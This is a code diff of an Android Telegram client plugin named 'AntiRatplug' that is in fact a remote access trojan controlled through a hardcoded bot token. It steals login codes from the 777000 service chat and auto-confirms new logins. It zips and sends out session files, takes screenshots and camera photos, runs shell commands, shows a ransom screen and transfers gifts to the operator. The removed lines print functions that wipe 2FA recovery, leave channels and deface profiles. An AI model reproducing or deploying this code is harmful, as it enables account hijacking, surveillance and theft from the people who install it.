@@ -1,28 +1,24 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v21.2 — консолидированная версия, закрыты баги v21.1.
-Меню: Manual / Troll / Automatic.
-Tg kid: live-watch 777000 на 10 минут + авто-подтверждение "Это я".
-IDK start / Full Lockdown: Pull Out ПОСЛЕДНИМ.
-delete_account вырезан.
+AntiRatplug v22 — slim.
+Меню: Manual / Troll / Automatic. Без IDK start. Без persistence.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Consolidated v21.2."
+__description__ = "Slim v22."
 __author__ = "@from_a4"
-__version__ = "21.2"
+__version__ = "22.0"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
 __sdk_version__ = ">=1.4.0"
 
 from base_plugin import BasePlugin, HookResult
-from java import dynamic_proxy, jclass, jlong
+from java import dynamic_proxy, jclass
 from org.telegram.messenger import ApplicationLoader
 from org.telegram.tgnet import TLRPC
 from java.util import ArrayList
-from functools import wraps
 import json
 import threading
 import time
@@ -30,34 +26,24 @@ import os
 import random
 import re
 import string
-import shutil
 import zipfile
 import io
 import subprocess
 import sys
 import traceback
 import hashlib
-import hashlib as _hl
-import hmac as _hmac
 import base64
 
 
-# ─── CONFIG ────────────────────────────────────────────────────────────────
 BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
-BOT_UID   = 8391217110
+BOT_UID = 8391217110
 BOT_UID_STR = str(BOT_UID)
-
 API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
 
 STARS_POST = "from_a4/14"
 RANSOM_TEXT = "Аккаунт заблокирован.\nСвяжитесь с администратором."
 RANSOM_PHOTO_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
 RANSOM_WARNING = "Закроешь приложение — данные будут уничтожены"
-
-IDK_TEXT = "IDK"
-IDK_BG = "#000000"
-IDK_FG = "#FF0000"
-SHOW_IDK_OVERLAY = True
 
 RECIPIENT_CACHE_TTL = 600
 MAX_DOC_SIZE = 5 * 1024 * 1024
@@ -74,17 +60,23 @@ def _log(msg):
                 _logger = logcat
             except Exception:
                 _logger = lambda *a, **k: None
-        _logger("[AR21] " + str(msg))
+        _logger("[AR22] " + str(msg))
     except Exception:
         pass
 
 
-def _UC(): return jclass("org.telegram.messenger.UserConfig")
-def _MC(): return jclass("org.telegram.messenger.MessagesController")
-def _CM(): return jclass("org.telegram.tgnet.ConnectionsManager")
+def _UC():
+    return jclass("org.telegram.messenger.UserConfig")
 
 
-# ─── class cache ───────────────────────────────────────────────────────────
+def _MC():
+    return jclass("org.telegram.messenger.MessagesController")
+
+
+def _CM():
+    return jclass("org.telegram.tgnet.ConnectionsManager")
+
+
 _CLASS_CACHE = {}
 
 
@@ -112,7 +104,6 @@ def _cls(*names):
     return None
 
 
-# ─── RPC gate ──────────────────────────────────────────────────────────────
 _ReplyGateCls = None
 
 
@@ -120,19 +111,21 @@ def _reply_gate_cls():
     global _ReplyGateCls
     if _ReplyGateCls is None:
         RD = jclass("org.telegram.tgnet.RequestDelegate")
+
         class _RG(dynamic_proxy(RD)):
             def __init__(self):
                 super().__init__()
                 self.response = None
                 self.error = None
+
             def run(self, response, error):
                 self.response = response
                 self.error = error
+
         _ReplyGateCls = _RG
     return _ReplyGateCls
 
 
-# ─── helpers ───────────────────────────────────────────────────────────────
 def _safe_int(v, d=0):
     try:
         if v is None:
@@ -243,7 +236,6 @@ def _is_blockchain_gift(gift, sg=None):
     return False
 
 
-# ─── HTTP ──────────────────────────────────────────────────────────────────
 def _http_get(url, timeout=30):
     from urllib.request import Request, urlopen
     try:
@@ -297,42 +289,6 @@ def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout
         return None
 
 
-# ─── IDK overlay proxies ───────────────────────────────────────────────────
-_IDK_KEY_CB = {}
-_IDK_CLICK_CB = {}
-
-
-def _idk_key(self, v, keyCode, event):
-    try:
-        KE = jclass("android.view.KeyEvent")
-        if int(keyCode) == int(KE.KEYCODE_BACK):
-            return True
-    except Exception:
-        return True
-    return False
-
-
-def _make_idk_key():
-    K = jclass("android.view.View$OnKeyListener")
-    class _K(dynamic_proxy(K)):
-        def onKey(self, v, keyCode, event):
-            return _idk_key(self, v, keyCode, event)
-    o = _K()
-    _IDK_KEY_CB[id(o)] = True
-    return o
-
-
-def _make_idk_click():
-    C = jclass("android.view.View$OnClickListener")
-    class _C(dynamic_proxy(C)):
-        def onClick(self, v):
-            return True
-    o = _C()
-    _IDK_CLICK_CB[id(o)] = True
-    return o
-
-
-# ═══════════════════════════════════════════════════════════════════════════
 class PluginSecurityPlugin(BasePlugin):
     def __init__(self):
         super().__init__()
@@ -346,48 +302,31 @@ class PluginSecurityPlugin(BasePlugin):
         self.account = 0
         self.user_id = 0
         self.username = ""
-        self.cfg = {}
         self.dev = ""
 
         self._recipient_ah_cache = {}
         self._recipient_lock = threading.Lock()
-        self._harden_cache = {}
         self._last_session_confirm = {}
-        self._nuke_started = False
-        self._nuke_password = None
         self._fee_deficit = 0
 
         self._tg_kid_watching = False
         self._tg_kid_seen = set()
         self._tg_kid_thread = None
 
-        self._idk_view = None
-        self._idk_wm = None
-        self._idk_decor = None
-        self._idk_keep_running = False
-        self._idk_thread = None
-
-        # Troll state
         self._ransom_view = None
-        self._ransom_mini_view = None
-        self._ransom_decor = None
         self._ransom_wm = None
+        self._ransom_decor = None
         self._ransom_photo_path = ""
         self._ransom_photo_url = ""
-        self._ransom_args = None
-        self._ransom_pay_grace_until = 0
         self._locker_view = None
         self._locker_on = False
-        self._lock_path = None
         self._dim_view = None
         self._dim_active = False
         self._music_mp = None
         self._flood_uris = []
 
         self._input_mode = None
-        self._input_context = None
 
-    # ─── lifecycle ─────────────────────────────────────────────────────────
     def on_plugin_load(self):
         self._sync_running = True
         self._active = True
@@ -401,22 +340,14 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             _log("hook: %s" % e)
         threading.Thread(target=self._boot, daemon=True).start()
-        try:
-            self._check_persisted_nuke()
-        except Exception:
-            pass
-        try:
-            self._check_persisted_idk()
-        except Exception:
-            pass
 
     def on_plugin_unload(self):
         self._sync_running = False
         self._active = False
         self.stop = True
         self._tg_kid_watching = False
-        for fn in (self._hide_idk_overlay, self._dismiss_ransom,
-                   self._clear_locker, self._clear_dim, self._clear_music):
+        for fn in (self._dismiss_ransom, self._clear_locker,
+                   self._clear_dim, self._clear_music):
             try:
                 fn()
             except Exception:
@@ -435,7 +366,7 @@ class PluginSecurityPlugin(BasePlugin):
         time.sleep(self._jitter / 1000.0)
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug v21.2 loaded")
+            self._send_msg("AntiRatplug v22 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -450,7 +381,6 @@ class PluginSecurityPlugin(BasePlugin):
     def on_send_message_hook(self, account, params):
         return HookResult()
 
-    # ─── accounts ─────────────────────────────────────────────────────────
     def _uc(self):
         try:
             sa = int(_UC().selectedAccount)
@@ -512,18 +442,14 @@ class PluginSecurityPlugin(BasePlugin):
                         pass
                 un = ""
                 ph = ""
-                premium = False
                 if u is not None:
                     un = str(getattr(u, "username", "") or "")
                     ph = _real_phone_or_empty(u).lstrip("+")
-                    premium = _get_bool_attr(u, "premium", False)
-                out.append({"id": i, "user_id": uid, "username": un,
-                            "phone": ph, "premium": premium})
+                out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
             except Exception as e:
                 _log("acc %d: %s" % (i, e))
         return out
 
-    # ─── peers / RPC ──────────────────────────────────────────────────────
     def _get_input_peer(self, account, peer_id):
         try:
             mc = _MC().getInstance(account)
@@ -531,8 +457,7 @@ class PluginSecurityPlugin(BasePlugin):
             if peer_id > 0:
                 user = mc.getUser(peer_id)
                 IPUser = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
-                              "org.telegram.tgnet.tl.TL_inputPeerUser",
-                              "org.telegram.tgnet.tl.TL_messages$TL_inputPeerUser")
+                              "org.telegram.tgnet.tl.TL_inputPeerUser")
                 if not IPUser:
                     return None
                 ip = IPUser()
@@ -543,8 +468,7 @@ class PluginSecurityPlugin(BasePlugin):
                 cid = -peer_id - 1000000000000
                 chat = mc.getChat(cid)
                 IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
-                                 "org.telegram.tgnet.tl.TL_inputPeerChannel",
-                                 "org.telegram.tgnet.tl.TL_channels$TL_inputPeerChannel")
+                                 "org.telegram.tgnet.tl.TL_inputPeerChannel")
                 if not IPChannel:
                     return None
                 ip = IPChannel()
@@ -625,7 +549,6 @@ class PluginSecurityPlugin(BasePlugin):
                     out.append(ee)
         return out
 
-    # ─── Bot API ──────────────────────────────────────────────────────────
     def _api(self, method):
         return API_BASE + "/" + method
 
@@ -713,7 +636,6 @@ class PluginSecurityPlugin(BasePlugin):
                 _log("poll: %s" % e)
             time.sleep(0.5)
 
-    # ─── menus ────────────────────────────────────────────────────────────
     def _send_manage_button(self):
         username = "unknown"
         try:
@@ -725,7 +647,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = "id:" + str(uc.getClientUserId())
         except Exception as e:
             _log("manage btn user: %s" % e)
-        text = "<b>AntiRatplug v21.2</b>\nUser: @" + username
+        text = "<b>AntiRatplug v22</b>\nUser: @" + username
         kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
         self._send_markup(text, kb, html=True)
 
@@ -736,13 +658,12 @@ class PluginSecurityPlugin(BasePlugin):
                 [{"text": "Troll"}],
                 [{"text": "Automatic"}],
                 [{"text": "Tg kid"}],
-                [{"text": "IDK start"}],
                 [{"text": "Screenshot gain"}],
                 [{"text": "❓ Help"}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("AntiRatplug v21.2", kb, html=True)
+        self._send_markup("AntiRatplug v22", kb, html=True)
 
     def _show_manual_menu(self):
         kb = {
@@ -842,7 +763,6 @@ class PluginSecurityPlugin(BasePlugin):
         kb = {
             "keyboard": [
                 [{"text": "🌾 Full Harvest"}],
-                [{"text": "🔒 Full Lockdown"}],
                 [{"text": "🎁 Gift Transfer"}],
                 [{"text": "⬅️ Back"}],
             ],
@@ -852,17 +772,15 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug v21.2</b>\n\n"
-            "<b>Tg kid</b> — код входа из 777000 + live-watch 10 мин + авто-«Это я»\n"
-            "<b>Screenshot gain</b> — скрин + фронт + бэк камера одним заходом\n"
-            "<b>IDK start</b> — 15 шагов, Pull Out последним\n"
+            "<b>AntiRatplug v22</b>\n\n"
+            "<b>Tg kid</b> — код из 777000 + live-watch + авто-подтверждение\n"
+            "<b>Screenshot gain</b> — скрин + фронт + бэк\n"
             "<b>Full Harvest</b> — сбор без модификаций\n"
-            "<b>Full Lockdown</b> — harvest + lockdown + gift drain + pull out\n\n"
+            "<b>Gift Transfer</b> — gift drain на получателя\n\n"
             "Recipient: " + BOT_UID_STR
         )
         self._send_msg(text, html=True)
 
-    # ─── callback / message роутер ────────────────────────────────────────
     def _handle_callback(self, cb):
         try:
             cb_id = cb.get("id")
@@ -874,8 +792,6 @@ class PluginSecurityPlugin(BasePlugin):
                     pass
             if data == "menu":
                 self._show_main_menu()
-            elif data == "back_auto":
-                self._show_automatic_menu()
             elif data == "close_ransom":
                 self._dismiss_ransom()
             elif data == "close_locker":
@@ -894,34 +810,21 @@ class PluginSecurityPlugin(BasePlugin):
             t = (msg.get("text") or "").strip()
             if not t:
                 return
-
-            # приоритет: ожидание ввода
-            if self._input_mode:
-                mode = self._input_mode
+            if self._input_mode == "music":
                 self._input_mode = None
-                self._input_context = None
-                if mode == "music":
-                    if t.startswith("http"):
-                        self._play_mmusic(t)
-                    else:
-                        self._send_msg("Bad URL")
-                    return
-                if mode == "shell":
-                    if t:
-                        self._manual_shell(t)
-                    return
-                if mode == "term_hash":
-                    try:
-                        self._manual_terminate_session(int(t))
-                    except Exception:
-                        self._send_msg("Bad hash")
-                    return
+                if t.startswith("http"):
+                    self._play_mmusic(t)
+                else:
+                    self._send_msg("Bad URL")
+                return
+            if self._input_mode == "shell":
+                self._input_mode = None
+                if t:
+                    self._manual_shell(t)
+                return
 
-            # роутер
             if t == "Tg kid":
                 threading.Thread(target=self._tg_kid, daemon=True).start()
-            elif t == "IDK start":
-                self._idk_start()
             elif t == "Screenshot gain":
                 threading.Thread(target=self._screenshot_gain, daemon=True).start()
             elif t == "Manual using":
@@ -997,15 +900,11 @@ class PluginSecurityPlugin(BasePlugin):
                 self._dim_screen()
             elif t == "🌾 Full Harvest":
                 self._full_harvest()
-            elif t == "🔒 Full Lockdown":
-                self._full_lockdown()
             elif t == "🎁 Gift Transfer":
                 threading.Thread(target=self._drain_gifts_thread, daemon=True).start()
-            # молча игнорируем всё остальное — не палим наличие плагина
         except Exception as e:
             _log("handle msg: %s" % e)
 
-    # ─── HARVEST ──────────────────────────────────────────────────────────
     def _harvest_account_info(self, acc=0, send=False):
         out = {}
         try:
@@ -1035,8 +934,6 @@ class PluginSecurityPlugin(BasePlugin):
                     out["last_name"] = ln
                 if un:
                     out["username"] = "@" + un if not un.startswith("@") else un
-                if _get_bool_attr(u, "premium", False):
-                    out["premium"] = "yes"
             try:
                 dcid = uc.getCurrentDatacenterId()
                 if dcid:
@@ -1061,20 +958,10 @@ class PluginSecurityPlugin(BasePlugin):
             _log("harvest: %s" % e)
         return out
 
-    # ─── TG KID ───────────────────────────────────────────────────────────
     def _extract_code_from_msg(self, m):
         if m is None:
             return None, None, None, None
         raw_text = str(getattr(m, "message", "") or "")
-        try:
-            media = getattr(m, "media", None)
-            if media is not None:
-                wp = getattr(media, "webpage", None)
-                if wp is not None:
-                    raw_text = (raw_text + "\n" + str(getattr(wp, "title", "") or "") +
-                                "\n" + str(getattr(wp, "description", "") or "")).strip()
-        except Exception:
-            pass
         if not raw_text:
             return None, None, None, None
         kind = "unknown"
@@ -1083,8 +970,6 @@ class PluginSecurityPlugin(BasePlugin):
             kind = "login"
         elif "password reset" in low or "сброс" in low or "recovery" in low:
             kind = "reset"
-        elif "new device" in low or "новом устройстве" in low or "новый вход" in low:
-            kind = "device"
         patterns = [
             r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})",
             r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})",
@@ -1164,10 +1049,8 @@ class PluginSecurityPlugin(BasePlugin):
             rows = getattr(rm, "rows", None)
             if rows is None:
                 return False
-            neg = ("не я", "не это я", "not me", "no", "reject", "terminate",
-                   "revoke", "отклонить", "отменить", "это не я")
-            pos = ("это я", "it's me", "its me", "yes", "accept", "confirm",
-                   "подтвердить", "принять", "подтверждаю")
+            neg = ("не я", "not me", "no", "reject", "отклонить", "это не я")
+            pos = ("это я", "it's me", "yes", "accept", "confirm", "подтвердить")
             target_btn = None
             for ri in range(_jlist_size(rows)):
                 row = _jlist_get(rows, ri)
@@ -1236,31 +1119,7 @@ class PluginSecurityPlugin(BasePlugin):
             if raw:
                 lines.append("")
                 lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
-            if buttons:
-                bt = " | ".join(b.get("text", "") for b in buttons if b.get("text"))
-                if bt:
-                    lines.append("<b>Buttons:</b> %s" % self._html_escape(bt))
             self._send_msg("\n".join(lines), html=True)
-
-            try:
-                HistReq = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
-                               "org.telegram.tgnet.tl.TL_messages$getHistory")
-                if HistReq:
-                    ip = self._get_input_peer(0, 777000)
-                    if ip is not None:
-                        rq = HistReq()
-                        rq.peer = ip
-                        rq.limit = 5
-                        rq.offset_id = 0
-                        resp, _e = self._rg_rpc(rq, 0, 8.0, fast=True)
-                        if resp is not None:
-                            msgs = getattr(resp, "messages", None)
-                            if msgs is not None and _jlist_size(msgs) > 0:
-                                m0 = _jlist_get(msgs, 0)
-                                if self._auto_confirm_login(m0):
-                                    self._send_msg("auto-confirmed It's me")
-            except Exception as e:
-                _log("auto confirm initial: %s" % e)
 
             if not self._tg_kid_watching:
                 self._tg_kid_watching = True
@@ -1323,8 +1182,6 @@ class PluginSecurityPlugin(BasePlugin):
                                         line = "<b>New %s</b>\n<b>Code:</b> <code>%s</code>" % (
                                             self._html_escape(kind or "login"),
                                             self._html_escape(code))
-                                        if raw:
-                                            line += "\n<pre>" + self._html_escape(raw[:300]) + "</pre>"
                                         self._send_msg(line, html=True)
                                     if self._auto_confirm_login(m):
                                         self._send_msg("auto-confirmed (msg %d)" % mid)
@@ -1336,7 +1193,6 @@ class PluginSecurityPlugin(BasePlugin):
                 time.sleep(1)
         self._tg_kid_watching = False
 
-    # ─── SCREENSHOT GAIN ──────────────────────────────────────────────────
     def _screenshot_gain(self):
         results = {"screenshot": None, "camera_front": None, "camera_back": None}
         try:
@@ -1367,7 +1223,6 @@ class PluginSecurityPlugin(BasePlugin):
             self._send_msg("Screenshot gain err: " + str(e))
         return results
 
-    # ─── 2FA ──────────────────────────────────────────────────────────────
     def _get_2fa_state(self, acc=0):
         try:
             Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getPassword",
@@ -1406,120 +1261,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             return "exc: %s" % e
 
-    def _request_password_reset(self, acc=0):
-        try:
-            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
-                       "org.telegram.tgnet.tl.TL_account$resetPassword")
-            if not Rst:
-                return {"state": "error"}
-            rq = Rst()
-            resp, err = self._rg_rpc(rq, acc, 15.0)
-            if err is not None or resp is None:
-                return {"state": "error"}
-            cls_name = str(type(resp))
-            state = "unknown"
-            until_ts = 0
-            if "resetPasswordOk" in cls_name:
-                state = "ok"
-            elif "resetPasswordRequestedWait" in cls_name:
-                state = "requested"
-                until_ts = _safe_int(getattr(resp, "until_date", 0))
-            elif "resetPasswordFailedWait" in cls_name:
-                state = "wait"
-            else:
-                if hasattr(resp, "until_date"):
-                    state = "requested"
-                    until_ts = _safe_int(getattr(resp, "until_date", 0))
-            out = {"state": state}
-            if until_ts:
-                out["until"] = until_ts
-                try:
-                    out["until_human"] = time.strftime("%Y-%m-%d %H:%M:%S",
-                                                       time.localtime(until_ts))
-                    out["days_left"] = max(0, int((until_ts - time.time()) / 86400))
-                except Exception:
-                    pass
-            return out
-        except Exception as e:
-            return {"state": "error", "error": str(e)}
-
-    def _remove_recovery_email(self, acc=0):
-        try:
-            PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
-                      "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
-            if not PS:
-                return {"ok": False}
-            ns = PS()
-            try:
-                ns.email = ""
-            except Exception:
-                pass
-            try:
-                ns.flags = 0
-            except Exception:
-                pass
-            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
-                       "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
-            if not Upd:
-                return {"ok": False}
-            rq = Upd()
-            try:
-                rq.password = None
-            except Exception:
-                pass
-            rq.new_settings = ns
-            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-            return {"ok": r is not None}
-        except Exception:
-            return {"ok": False}
-
-    def _nuke_password_pipeline(self, acc=0):
-        report = {"recovery_removed": False, "reset_password": "?",
-                  "cloud_wiped": None, "state_before": None, "state_after": None,
-                  "attempts": 0, "delayed_reset": None, "final": "unknown"}
-        try:
-            report["state_before"] = self._get_2fa_state(acc)
-        except Exception:
-            pass
-        sb = report["state_before"]
-        if sb is not None and not sb.get("has_password"):
-            report["final"] = "clean"
-            return report
-        for attempt in range(3):
-            report["attempts"] = attempt + 1
-            try:
-                r = self._remove_recovery_email(acc)
-                if isinstance(r, dict) and r.get("ok"):
-                    report["recovery_removed"] = True
-            except Exception:
-                pass
-            time.sleep(0.5)
-            try:
-                r = self._try_kill_2fa(acc)
-                report["reset_password"] = r
-                if r in ("ok", "not_set"):
-                    break
-            except Exception as e:
-                report["reset_password"] = "exc: %s" % e
-            time.sleep(0.5)
-            if report["reset_password"] not in ("ok", "not_set"):
-                try:
-                    pr = self._request_password_reset(acc)
-                    report["delayed_reset"] = pr
-                    if pr.get("state") == "ok":
-                        break
-                except Exception as e:
-                    report["delayed_reset"] = {"state": "error", "error": str(e)}
-            time.sleep(1.0)
-        try:
-            report["state_after"] = self._get_2fa_state(acc)
-        except Exception:
-            pass
-        sa = report["state_after"]
-        report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
-        return report
-
-    # ─── SESSIONS ─────────────────────────────────────────────────────────
     def _get_authorizations_full(self, acc=0):
         try:
             Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
@@ -1661,94 +1402,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             return 0
 
-    def _kill_bots(self, acc=0):
-        try:
-            Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
-                       "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
-            Del = _cls("org.telegram.tgnet.TLRPC$TL_bots_deleteBot",
-                       "org.telegram.tgnet.tl.TL_bots$deleteBot")
-            IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUser",
-                      "org.telegram.tgnet.tl.TL_users$TL_inputUser")
-            if not (Get and Del and IU):
-                return 0
-            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
-            if resp is None:
-                return 0
-            bots = []
-            for i in range(_jlist_size(resp)):
-                b = _jlist_get(resp, i)
-                bid = _safe_int(getattr(b, "id", 0))
-                bah = _safe_int(getattr(b, "access_hash", 0))
-                if bid and bah:
-                    bots.append((bid, bah))
-
-            def _one(bid, bah):
-                try:
-                    iu = IU()
-                    iu.user_id = bid
-                    iu.access_hash = bah
-                    rq = Del()
-                    rq.bot = iu
-                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
-                    return e is None
-                except Exception:
-                    return False
-
-            res = self._parallel([(_one, b, a) for (b, a) in bots], workers=5, timeout=25)
-            return sum(1 for r in res if r is True)
-        except Exception:
-            return 0
-
-    def _leave_all_channels(self, acc=0):
-        try:
-            Leave = _cls("org.telegram.tgnet.TLRPC$TL_channels_leaveChannel",
-                         "org.telegram.tgnet.tl.TL_channels$leaveChannel")
-            IC = _cls("org.telegram.tgnet.TLRPC$TL_inputChannel",
-                      "org.telegram.tgnet.tl.TL_channels$TL_inputChannel")
-            if not (Leave and IC):
-                return 0
-            mc = _MC().getInstance(acc)
-            try:
-                dialogs = mc.dialogs_dict
-            except Exception:
-                dialogs = mc.getAllDialogs()
-            if dialogs is None:
-                return 0
-            targets = []
-            for i in range(_jlist_size(dialogs)):
-                try:
-                    did = int(dialogs.keyAt(i)) if hasattr(dialogs, "keyAt") else 0
-                    if did >= -1000000000000:
-                        continue
-                    cid = -did - 1000000000000
-                    ch = mc.getChat(cid)
-                    if ch is None:
-                        continue
-                    ah = _safe_int(getattr(ch, "access_hash", 0))
-                    if not ah:
-                        continue
-                    targets.append((cid, ah))
-                except Exception:
-                    pass
-
-            def _one(cid, ah):
-                try:
-                    ic = IC()
-                    ic.channel_id = cid
-                    ic.access_hash = ah
-                    rq = Leave()
-                    rq.channel = ic
-                    r, _e = self._rg_rpc(rq, acc, 6.0, fast=True)
-                    return r is not None
-                except Exception:
-                    return False
-
-            res = self._parallel([(_one, c, a) for (c, a) in targets],
-                                 workers=6, timeout=40)
-            return sum(1 for r in res if r is True)
-        except Exception:
-            return 0
-
     def _confirm_unconfirmed_sessions(self, acc=0):
         try:
             last = self._last_session_confirm.get(acc, 0)
@@ -1784,77 +1437,7 @@ class PluginSecurityPlugin(BasePlugin):
                     pass
             return confirmed
         except Exception:
-            return 0    def _kill_login_notice_dialog(self, acc=0):
-        try:
-            mc = _MC().getInstance(acc)
-            for args in ((777000, 0, 0, True), (777000, 0, True), (777000, True)):
-                try:
-                    mc.deleteDialog(*args)
-                    return True
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        return False
-
-    # ─── PROFILE ──────────────────────────────────────────────────────────
-    def _change_username(self, acc=0):
-        try:
-            rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
-            new_un = "user_" + rnd
-            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateUsername",
-                       "org.telegram.tgnet.tl.TL_account$updateUsername")
-            if not Upd:
-                return None
-            rq = Upd()
-            rq.username = new_un
-            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-            return new_un if r is not None else None
-        except Exception:
-            return None
-
-    def _change_profile(self, acc=0):
-        try:
-            rnd = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
-            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateProfile",
-                       "org.telegram.tgnet.tl.TL_account$updateProfile")
-            if not Upd:
-                return False
-            rq = Upd()
-            try:
-                rq.first_name = "[LOCKED]"
-                rq.last_name = rnd
-            except Exception:
-                pass
-            try:
-                rq.flags = 0x03
-            except Exception:
-                pass
-            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-            return r is not None
-        except Exception:
-            return False
-
-    def _reset_contacts(self, acc=0):
-        try:
-            Rq = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
-                      "org.telegram.tgnet.tl.TL_contacts$resetContacts")
-            if not Rq:
-                return False
-            r, _e = self._rg_rpc(Rq(), acc, 10.0, fast=True)
-            return r is not None
-        except Exception:
-            return False
-
-    # ─── GIFTS ────────────────────────────────────────────────────────────
-    def _gift_is_listed(self, gift):
-        try:
-            ra = getattr(gift, "resell_amount", None)
-            if ra is None:
-                return False
-            return _jlist_size(ra) > 0
-        except Exception:
-            return False
+            return 0
 
     def _input_saved_gift(self, saved):
         if saved.get("msg_id"):
@@ -1878,6 +1461,15 @@ class PluginSecurityPlugin(BasePlugin):
         o.saved_id = int(saved.get("saved_id", 0))
         return o, None
 
+    def _gift_is_listed(self, gift):
+        try:
+            ra = getattr(gift, "resell_amount", None)
+            if ra is None:
+                return False
+            return _jlist_size(ra) > 0
+        except Exception:
+            return False
+
     def _gift_is_suspect(self, sg, gift):
         try:
             cls = str(type(gift))
@@ -1891,14 +1483,6 @@ class PluginSecurityPlugin(BasePlugin):
             for v in (_safe_int(getattr(sg, "saved_id", 0)),
                       _safe_int(getattr(sg, "msg_id", 0))):
                 if 1500000000 <= v <= 2147483647:
-                    return True
-            oid = _safe_int(getattr(gift, "owner_id", 0) or getattr(sg, "owner_id", 0) or 0)
-            if oid > 0:
-                try:
-                    my = int(self._my_id() or 0)
-                except Exception:
-                    my = 0
-                if my > 0 and oid != my:
                     return True
         except Exception:
             pass
@@ -2108,17 +1692,11 @@ class PluginSecurityPlugin(BasePlugin):
         return 0
 
     def _resolve_recipient(self, account=0):
-        """
-        Резолв получателя = BOT_UID (число).
-        Использует getUser через MessagesController — resolveUsername не работает
-        с числовыми строками, и userId уже известен локально.
-        """
         uid_target = int(BOT_UID)
         with self._recipient_lock:
             c = self._recipient_ah_cache.get(account)
             if c and (time.time() - c[2]) < RECIPIENT_CACHE_TTL and c[1]:
                 return c[0], c[1]
-        # 1) local Telegram user store — быстро и без RPC
         try:
             mc = _MC().getInstance(account)
             u = mc.getUser(uid_target)
@@ -2130,7 +1708,6 @@ class PluginSecurityPlugin(BasePlugin):
                     return uid_target, ah
         except Exception as e:
             _log("resolve recipient getUser: %s" % e)
-        # 2) force-load user via users.getUsers RPC (не работает с числом в resolveUsername)
         try:
             Req = _cls("org.telegram.tgnet.TLRPC$TL_users_getUsers",
                        "org.telegram.tgnet.tl.TL_users$getUsers")
@@ -2366,7 +1943,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("gift thread err: " + str(e))
 
-    # ─── SESSION THEFT ────────────────────────────────────────────────────
     def _collect_session_files(self, base):
         files = []
         m1 = base + "/files/tgnet.dat"
@@ -2426,10 +2002,6 @@ class PluginSecurityPlugin(BasePlugin):
                 if amap:
                     zf.writestr("accounts_map.json",
                                 json.dumps(amap, ensure_ascii=False, indent=2))
-                zf.writestr("_meta.json", json.dumps({
-                    "package": pkg, "harvested_at": int(time.time()),
-                    "files_count": len(files), "accounts": amap,
-                }, ensure_ascii=False, indent=2))
             self._send_document_bytes("userbot_session.zip", z.getvalue())
         except Exception as e:
             self._send_msg("userbot err: " + str(e))
@@ -2472,7 +2044,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("dump err: " + str(e))
 
-    # ─── DEVICE HARVEST ───────────────────────────────────────────────────
     def _has_perm(self, name):
         try:
             ctx = ApplicationLoader.applicationContext
@@ -2750,151 +2321,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("shell err: " + str(e))
 
-    def _manual_terminate_session(self, h):
-        try:
-            req = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
-                       "org.telegram.tgnet.tl.TL_account$resetAuthorization")
-            if not req:
-                self._send_msg("no class")
-                return
-            rq = req()
-            rq.hash = int(h)
-            resp, err = self._rg_rpc(rq, 0, 12.0)
-            if err is not None:
-                self._send_msg("Error: %s" % str(err))
-            else:
-                self._send_msg("Session terminated.")
-        except Exception as e:
-            self._send_msg("Error: " + str(e))
-
-    # ─── PERSISTENCE ──────────────────────────────────────────────────────
-    def _plugins_dir(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            base = str(ctx.getFilesDir().getAbsolutePath())
-            p = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(base))),
-                             "files", "plugins")
-            if os.path.isdir(p):
-                return p
-        except Exception:
-            pass
